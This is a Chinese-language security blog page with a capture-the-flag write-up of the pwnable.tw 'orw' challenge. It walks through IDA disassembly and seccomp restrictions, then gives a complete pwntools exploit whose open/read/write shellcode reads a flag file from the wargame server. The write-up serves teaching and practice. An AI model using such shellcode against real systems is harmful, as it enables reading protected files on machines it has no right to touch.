<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>Tag: pwn | TinyMagicka</title>
    <meta name="author" content="TinyMagicka" />
    <meta name="version" content="1.0.0" />
    <meta name="keywords" content="Android PWN" />
    <meta name="description" content="Android &amp;amp; Linux &amp;amp; PWN" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
    <meta name="baidu-site-verification" content="F0CXvmUgA9" />

    
    
    <link rel="icon" href="/images/favicon.png">
    

    <link rel="stylesheet" href="/css/style.css">
</head>
<body>

    <div class="app">
        <header class="header clearfix">
    <div id="nav" class="nav">
    <button id="open-panel" class="open-panel"><i class="icon-library"></i></button>

    <nav class="nav-inner">

        
        
        <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
        </li>
        
        
        
        <li class="nav-item nav-item-tag">
            <a id="nav-tag" class="nav-link" href="#">标签</a>
            <div id="nav-tags" class="nav-tag-wrap">
                <i class="nav-tag-arrow"></i>
                
  <div class="widget-wrap">
    <h3 class="widget-title">
        <i class="icon-tag vm"></i>
        <span class="vm">Tags</span>
    </h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Papers/">Papers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a></li></ul>
    </div>
  </div>


            </div>
        </li>
        
        
        
        <li class="nav-item">
            <a class="nav-link" href="/archives">归档</a>
        </li>
        
        
        
        <li class="nav-item">
            <a class="nav-link" href="/about">关于</a>
        </li>
        
        
        

    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>

        
        

        
        <div class="author-meta">
            
            <div class="author-avatar">
                <a href="/">
                    <img src="/images/avatar.png" title="Sanonz">
                </a>
            </div>
            
            <div class="author-name">TinyMagicka</div>
            <div class="author-work">Android &amp; Linux PWN</div>
            <div class="author-location">
                <i class="icon-location vm"></i>
                <span class="vm">Beijing, China</span>
            </div>
            
            <div class="author-thread-wrap">
                <div class="author-threads clearfix">
                    
                    <a class="thread-item" href="https://github.com/TinyMagicka" target="_blank" rel="noopener"><i class="icon-github"></i></a>
                    
                    
                    
                </div>
            </div>
            
        </div>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2017/10/04/pwnable-tw-orw/">pwnable.tw系列———orw</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="/2017/10/04/pwnable-tw-orw/">
    
    <i class="icon-calendar"></i>
    
    <time datetime="2017-10-04T00:20:28.000Z" itemprop="datePublished">2017-10-04</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag"></i>
    <a class="article-tag-link" href="/tags/pwn/">pwn</a>, <a class="article-tag-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <a id="more"></a>
<h6 id="pwnable-tw系列——orw"><a href="#pwnable-tw系列——orw" class="headerlink" title="pwnable.tw系列——orw"></a>pwnable.tw系列——orw</h6><p>下载orw ，放入ida 查看:</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    orw_seccomp</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">call    _printf</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    0C8h            ; nbytes</span><br><span class="line">push    offset shellcode ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, offset shellcode</span><br><span class="line">call    eax ; shellcode</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>
<p>orw_seccomp函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.text:080484CB ; Attributes: bp-based frame</span><br><span class="line">.text:080484CB</span><br><span class="line">.text:080484CB                 public orw_seccomp</span><br><span class="line">.text:080484CB orw_seccomp     proc near               ; CODE XREF: main+11p</span><br><span class="line">.text:080484CB</span><br><span class="line">.text:080484CB var_84          = word ptr -84h</span><br><span class="line">.text:080484CB var_80          = dword ptr -80h</span><br><span class="line">.text:080484CB var_7C          = byte ptr -7Ch</span><br><span class="line">.text:080484CB var_1C          = dword ptr -1Ch</span><br><span class="line">.text:080484CB</span><br><span class="line">.text:080484CB                 push    ebp</span><br><span class="line">.text:080484CC                 mov     ebp, esp</span><br><span class="line">.text:080484CE                 push    edi</span><br><span class="line">.text:080484CF                 push    esi</span><br><span class="line">.text:080484D0                 push    ebx</span><br><span class="line">.text:080484D1                 sub     esp, 7Ch</span><br><span class="line">.text:080484D4                 mov     eax, large gs:14h</span><br><span class="line">.text:080484DA                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:080484DD                 xor     eax, eax</span><br><span class="line">.text:080484DF                 lea     eax, [ebp+var_7C]</span><br><span class="line">.text:080484E2                 mov     ebx, offset unk_8048640</span><br><span class="line">.text:080484E7                 mov     edx, 18h</span><br><span class="line">.text:080484EC                 mov     edi, eax</span><br><span class="line">.text:080484EE                 mov     esi, ebx</span><br><span class="line">.text:080484F0                 mov     ecx, edx</span><br><span class="line">.text:080484F2                 rep movsd</span><br><span class="line">.text:080484F4                 mov     [ebp+var_84], 0Ch</span><br><span class="line">.text:080484FD                 lea     eax, [ebp+var_7C]</span><br><span class="line">.text:08048500                 mov     [ebp+var_80], eax</span><br><span class="line">.text:08048503                 sub     esp, 0Ch</span><br><span class="line">.text:08048506                 push    0</span><br><span class="line">.text:08048508                 push    0</span><br><span class="line">.text:0804850A                 push    0</span><br><span class="line">.text:0804850C                 push    1</span><br><span class="line">.text:0804850E                 push    26h             ; option</span><br><span class="line">.text:08048510                 call    _prctl          ; PR_SET_NO_NEW_PRIVS</span><br><span class="line">.text:08048515                 add     esp, 20h</span><br><span class="line">.text:08048518                 sub     esp, 4</span><br><span class="line">.text:0804851B                 lea     eax, [ebp+var_84]</span><br><span class="line">.text:08048521                 push    eax</span><br><span class="line">.text:08048522                 push    2</span><br><span class="line">.text:08048524                 push    16h             ; option</span><br><span class="line">.text:08048526                 call    _prctl          ; 限制syscall  read write</span><br><span class="line">.text:0804852B                 add     esp, 10h</span><br><span class="line">.text:0804852E                 nop</span><br><span class="line">.text:0804852F                 mov     eax, [ebp+var_1C]</span><br><span class="line">.text:08048532                 xor     eax, large gs:14h</span><br><span class="line">.text:08048539                 jz      short loc_8048540</span><br><span class="line">.text:0804853B                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure></p>
<p><br>       </p>
<p>观察一会汇编代码，得到程序大概意思：</p>
<h6 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h6><pre><code>首先调用orw_seccomp函数
然后读取用户输入的shellcode
直接执行shellcode ——————可以看到没有开启NX位
</code></pre><h6 id="orw-seccomp函数："><a href="#orw-seccomp函数：" class="headerlink" title="orw_seccomp函数："></a>orw_seccomp函数：</h6><pre><code>第一次调用prctl函数 ————禁止提权
第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit


本来不知道prctl函数干啥的，google了一下，
翻看github上的源码中有函数参数定义，
加上man prctl 之后就知道大致意思了
</code></pre><p><br><br>幸好本题不需要提权，只要读取文件就行了，简而言之就是练习编写shellcode</p>
<p>仍然使用非常好用的pwntool库</p>
<p>需要注意的地方：<br>1: sys_open             </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本来以为能使用的系统调用只有sys_read和sys_write     </span><br><span class="line">    但是必须得用sys_open才能获取文件描述符，  </span><br><span class="line">    实际上确实可以使用sys_open</span><br></pre></td></tr></table></figure>
<p>2: 如何确定系统调用的中断号？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat /usr/include/asm/unistd_32.h </span><br><span class="line">#ifndef _ASM_X86_UNISTD_32_H</span><br><span class="line">#define _ASM_X86_UNISTD_32_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_restart_syscall 0</span><br><span class="line">#define __NR_exit 1</span><br><span class="line">#define __NR_fork 2</span><br><span class="line">#define __NR_read 3</span><br><span class="line">#define __NR_write 4</span><br><span class="line">#define __NR_open 5</span><br><span class="line">#define __NR_close 6</span><br><span class="line">#define __NR_waitpid 7</span><br><span class="line">#define __NR_creat 8</span><br><span class="line">#define __NR_link 9</span><br><span class="line">#define __NR_unlink 10</span><br><span class="line">#define __NR_execve 11</span><br><span class="line">#define __NR_chdir 12</span><br><span class="line">#define __NR_time 13</span><br><span class="line">#define __NR_mknod 14</span><br><span class="line">#define __NR_chmod 15</span><br><span class="line">#define __NR_lchown 16</span><br><span class="line">#define __NR_break 17</span><br></pre></td></tr></table></figure>
<h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#encoding:UTF-8</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&apos;i386&apos;, os=&apos;linux&apos;)#设置目标机的信息</span><br><span class="line"></span><br><span class="line">f1 = u32(&quot;/hom&quot;)</span><br><span class="line">f2 = u32(&quot;e/or&quot;)</span><br><span class="line">f3 = u32(&quot;w/fl&quot;)</span><br><span class="line">f4 = u32(&quot;ag\x00r&quot;)</span><br><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">push 0x72006761</span><br><span class="line">push 0x6c662f77</span><br><span class="line">push 0x726f2f65</span><br><span class="line">push 0x6d6f682f</span><br><span class="line">mov  eax, 0x5</span><br><span class="line">mov  ebx,esp</span><br><span class="line">xor  ecx,ecx</span><br><span class="line">xor  edx,edx</span><br><span class="line">int  0x80</span><br><span class="line">sub  esp,0x30</span><br><span class="line">mov  ebx,eax</span><br><span class="line">mov  ecx,esp</span><br><span class="line">mov  edx,0x30</span><br><span class="line">mov eax,0x3</span><br><span class="line">int 0x80</span><br><span class="line">mov ebx,1</span><br><span class="line">mov ecx,esp</span><br><span class="line">mov edx,0x30</span><br><span class="line">mov eax,0x4</span><br><span class="line">int 0x80</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">#print(&quot;0x%x 0x%x 0x%x 0x%x &quot;)%(f1,f2,f3,f4)</span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line">#p = process(&quot;/root/tmp/orw&quot;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2017/10/01/pwnabletw_start/">pwnable.tw系列——start</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="/2017/10/01/pwnabletw_start/">
    
    <i class="icon-calendar"></i>
    
    <time datetime="2017-10-01T08:26:08.000Z" itemprop="datePublished">2017-10-01</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag"></i>
    <a class="article-tag-link" href="/tags/pwn/">pwn</a>, <a class="article-tag-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>pwnable.tw系列从此开始  </p>
        
        <p class="article-more-link">
            <a href="/2017/10/01/pwnabletw_start/#more">
                <span class="vm">阅读更多</span>
                <i class="icon-arrow-double-right vm"></i>    
            </a>
        </p>
        
        
    </section>
</article>





</div>
        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
</footer>

<script type="text/javascript" src="//s13.cnzz.com/z_stat.php?id=1234567890&amp;web_id=1234567890"></script>


    </div>

    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
    
    <script type="text/javascript">
        $(function() {
            var nodes = {
                nav: $('#nav'),
                aside: $('#aside'),
                navTags: $('#nav-tags')
            };

            $('#open-panel, #aside-mask').on('click', function() {
                nodes.aside.toggleClass('panel-show');
            });
            $('#nav-tag').on('click', function(event) {
                event.preventDefault();console.log(nodes.navTags.attr('class'))
                nodes.navTags.toggleClass('tag-show');console.log(nodes.navTags.attr('class'))
            })/*.hover(function() {
                nodes.navTags.addClass('tag-show');
            }, function() {
                nodes.navTags.removeClass('tag-show');
            });*/

            
        });
    </script>

</body>
</html>
